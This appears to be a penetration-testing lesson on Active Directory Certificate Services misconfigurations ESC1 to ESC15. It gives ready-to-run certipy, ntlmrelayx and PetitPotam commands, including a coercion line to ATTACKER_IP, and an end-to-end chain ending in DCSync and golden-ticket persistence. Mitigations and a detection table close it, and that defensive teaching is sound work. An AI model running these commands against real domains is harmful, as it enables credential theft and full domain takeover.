# AD CS Attacks — ESC1 to ESC15

Active Directory Certificate Services (AD CS) is the most under-audited path to Domain Admin in 2024–2026. SpecterOps catalogued 15 misconfigurations (ESC1–ESC15) that turn a low-priv user into a forged Smart-Card identity for **any** account, including KRBTGT. If you have one cert template misconfigured, the rest of your Tier-0 hardening is moot.

> [!warning] Domain-impact territory
> Every command below is for authorized AD lab work or contracted pentests. Issuing a certificate that authenticates as Domain Admin in production without scope is a destructive event.

## Why certs beat hashes

A user certificate authenticates via Kerberos PKINIT — no password, no NTLM hash, no MFA prompt by default. If you have the cert + private key for `Administrator@corp.local`, you ARE the administrator until the cert expires (often 1–10 years).

Tickets get rotated; certs don't.


![AD CS Attack Flow](/images/lessons/adcs_attack_flow_en.png)

## Toolkit

```terminal
pip install certipy-ad
# or the C# variant
git clone https://github.com/GhostPack/Certify
git clone https://github.com/GhostPack/Rubeus
```

The single-shot enumeration:

```terminal
certipy find -u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1 -vulnerable -stdout
```

This prints every CA, every template, and which ESC# applies. Run it on every internal engagement.

## ESC1 — Misconfigured template, ENROLLEE_SUPPLIES_SUBJECT

A template that lets the enrollee specify the SAN (Subject Alternative Name) and is enabled for client authentication. Request a cert "as" Administrator.

```terminal
certipy req -u alice@corp.local -p 'Pass1' \
  -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dns dc01.corp.local
# → administrator.pfx

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# → NT hash of administrator + TGT
```

> [!danger] One-shot DA
> ESC1 alone is end-game in most environments. Mitigation: remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and require Manager Approval on any template that allows SAN specification.

## ESC2 — Any Purpose / SubCA EKU

Template grants `Any Purpose` EKU, which qualifies for client auth + code signing + everything. Same exploitation as ESC1 once the SAN trick is allowed.

## ESC3 — Enrollment Agent

A template lets a low-priv user enroll **on behalf of others**. Request an Enrollment Agent cert, then enroll a Smart Card cert for any user.

```terminal
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template EnrollmentAgent
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template User \
  -on-behalf-of 'CORP\administrator' -pfx alice.pfx
```

## ESC4 — Vulnerable template ACL

Low-priv user has `WriteDacl` / `WriteOwner` / `WriteProperty` on a template object → rewrite the template to look like ESC1, exploit, restore.

```terminal
certipy template -u alice@corp.local -p 'Pass1' -template Workstation -save-old
# template now ESC1-equivalent
certipy req ... (as ESC1)
certipy template -u alice@corp.local -p 'Pass1' -template Workstation -configuration Workstation.json
```

## ESC5 — Vulnerable PKI object ACL

Same idea but on the CA object, NTAuthCertificates container, or pKIEnrollmentService — bigger blast radius.

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

Old CA registry flag that allows SAN injection on **any** template, even the default User template. Killed by Microsoft default in 2022 but still found.

```terminal
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template User \
  -upn administrator@corp.local
```

## ESC7 — CA management ACL

Low-priv user has `ManageCA` or `Manage Certificates` on the CA. Approve your own pending request, or change CA config to enable ESC6, exploit, revert.

```terminal
certipy ca -u alice@corp.local -p 'Pass1' -ca CORP-CA -add-officer alice
certipy ca -u alice@corp.local -p 'Pass1' -ca CORP-CA -enable-template EnrollmentAgent
```

## ESC8 — NTLM Relay to AD CS Web Enrollment

The famous PetitPotam → AD CS chain. Coerce DC NTLM auth, relay to `/certsrv/certfnsh.asp`, request a Smart Card cert as the DC computer account → DCSync.

```terminal
# terminal 1 — relay listener
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# terminal 2 — coerce
PetitPotam.py -u '' -p '' ATTACKER_IP DC01_IP
# (or coercer.py / dfscoerce.py / printerbug.py)

# Output: DC01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# → DC NT hash → DCSync krbtgt → golden tickets
```

> [!tip] Defenses (ESC8)
> Disable HTTP enrollment, enforce HTTPS + EPA (Extended Protection for Authentication), require channel binding, and remove unconstrained delegation paths. Patch the coercion vectors (CVE-2022-26925, CVE-2023-21768).

## ESC9 — No security extension

Template with `msPKI-Enrollment-Flag = 0x80000` (CT_FLAG_NO_SECURITY_EXTENSION) — the SID security extension absent → if you can change the UPN of a user (e.g., via GenericWrite from another attack), authentication maps to whatever account currently holds that UPN.

```terminal
# Pre-req: GenericWrite on a victim user
certipy account -u alice@corp.local -p 'Pass1' -user victim -upn administrator
certipy req -u victim ... -template ESC9Vuln
# Reset UPN, auth as administrator
```

## ESC10 — Weak certificate mapping

Two flavors: `StrongCertificateBindingEnforcement = 0` (registry) or `CertificateMappingMethods` allows weak mapping (UPN, RFC822). Same UPN-swap attack as ESC9.

## ESC11 — NTLM relay to ICPR (RPC)

Same idea as ESC8 but the protocol is RPC over port 135 instead of HTTP — meaning EPA doesn't help. Use `certipy relay` or `ntlmrelayx -t rpc://CA`.

## ESC12 — YubiHSM/SmartCard CA private key on filesystem

Some CAs store their private key in a file accessible to local admins. If you compromise the CA host, you exfil the CA private key and **issue your own certificates offline** — no logs, no audit, indefinite forgery.

## ESC13 — OID group link

Issuance Policy OID linked to a Universal/Global group via `msDS-OIDToGroupLink`. Enrolling a cert with that policy makes you a transitive member of the linked group during the certificate session.

```terminal
certipy find -u alice@corp.local -p 'Pass1' -oid-to-template-and-group
certipy req ... -template ESC13Vuln
# Auth grants membership in linked group, often Tier-0
```

## ESC14 — Strong cert mapping with explicit AD altSecurityIdentities

Attacker with `WriteProperty` on a target user can set `altSecurityIdentities` to map an arbitrary cert (one they own) to the victim. After mapping, authentication with the attacker's cert grants victim's identity.

```terminal
certipy account -u alice ... -user victim -alt 'X509:<I>DC=local,DC=corp...<S>CN=alice...'
certipy auth -pfx alice.pfx -username victim
```

## ESC15 — EKUwu / Schema V1

V1 templates allow application policies in CSR that override template-defined EKUs. Request a cert with a SubCA / Any-Purpose EKU even from a benign-looking template.

```terminal
certipy req -u alice ... -template WebServer -application-policies 'Client Authentication'
```

## End-to-end attack chain (typical engagement)

```terminal
# 1. Enumerate
certipy find -u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1 -vulnerable -stdout

# 2. Pick the lowest-noise win (ESC1 / ESC8 / ESC13)
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template ESC1Tmpl -upn administrator@corp.local

# 3. Auth → NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# 4. DCSync everything
secretsdump.py corp.local/administrator@dc01.corp.local -hashes :<NT> -just-dc

# 5. Persistence (golden ticket from krbtgt hash)
ticketer.py -nthash <krbtgt> -domain-sid S-1-5-21-... -domain corp.local Administrator
```

## Detection priorities

| Telemetry | Look for |
|-----------|----------|
| 4886 / 4887 (cert request / issued) | UPN in SAN ≠ requester sAMAccountName |
| 5145 (NTLM auth via SMB) | Service account from unexpected host |
| 4624 type 9 / cert logon | Cert issued < 5 minutes ago + admin scope |
| Schema modifications | Any change to a template's EKU or flags |
| `lsass` access | Beyond standard EDR vendor processes |

> [!info] Quick wins for defenders
> Disable HTTP enrollment (ESC8), enforce strong cert mapping registry keys (ESC9/10/14), require Manager Approval on any template with `Subject in Request`, and audit `ManageCA` rights weekly. Run `certipy find -vulnerable` against your own AD before the adversary does.
